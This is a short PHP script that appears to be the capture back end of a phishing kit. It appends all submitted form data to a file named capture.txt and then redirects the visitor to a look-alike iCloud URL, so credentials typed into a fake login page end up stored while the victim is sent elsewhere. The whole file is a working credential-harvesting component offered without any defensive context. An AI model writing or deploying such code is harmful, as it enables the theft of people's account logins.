<?php
$file = 'capture.txt';
file_put_contents($file, print_r($_POST, true), FILE_APPEND);

header('Location: https://gps.ubication-cloud.com/iCloudCompas/es/');
exit;
?>
